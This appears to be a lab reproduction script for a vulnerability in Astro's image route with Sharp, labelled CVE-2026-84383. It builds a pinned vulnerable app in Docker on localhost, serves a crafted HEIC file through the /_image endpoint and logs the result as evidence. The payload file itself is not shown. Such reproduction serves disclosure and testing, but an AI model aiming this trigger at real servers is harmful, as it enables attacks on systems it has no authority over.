#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
APP="${ROOT}/lab/app"
ARTIFACTS="${ROOT}/lab/artifacts"
LOG="${ARTIFACTS}/CVE-2026-84383-astro-route.log"

mkdir -p "${ARTIFACTS}" "${APP}/public"
cp "${ARTIFACTS}/CVE-2026-84383.heic" "${APP}/public/malicious.heic"

cd "${APP}"
if [[ ! -f package-lock.json ]]; then
  npm install --package-lock-only --ignore-scripts
fi

echo "[*] Building Astro 7.2.7 application with pinned Sharp 0.35.3"
docker build --tag astro-image-route-vulnerable "${APP}" | tee "${LOG}"

echo "[*] Starting isolated Astro server"
container_id=$(docker run --rm -d -p 127.0.0.1:4321:4321 astro-image-route-vulnerable)
cleanup() {
  docker logs "${container_id}" >>"${LOG}" 2>&1 || true
  docker rm -f "${container_id}" >/dev/null 2>&1 || true
}
trap cleanup EXIT

for _ in $(seq 1 30); do
  if curl -fsS http://127.0.0.1:4321/ >/dev/null; then
    break
  fi
  sleep 1
done

echo "[*] Requesting Astro /_image optimization with crafted HEIC"
set +e
curl -sS -D "${ARTIFACTS}/CVE-2026-84383-astro-route.headers" \
  --max-time 20 \
  'http://127.0.0.1:4321/_image?href=%2Fmalicious.heic&f=webp&w=16' \
  -o "${ARTIFACTS}/CVE-2026-84383-astro-route.body"
status=$?
set -e

{
  echo
  echo "[*] curl exit=${status}"
  echo "[*] response headers"
  cat "${ARTIFACTS}/CVE-2026-84383-astro-route.headers"
  echo "[*] server log"
  docker logs "${container_id}" 2>&1 || true
} >>"${LOG}"

echo "[+] Evidence saved to ${LOG}"
exit 0
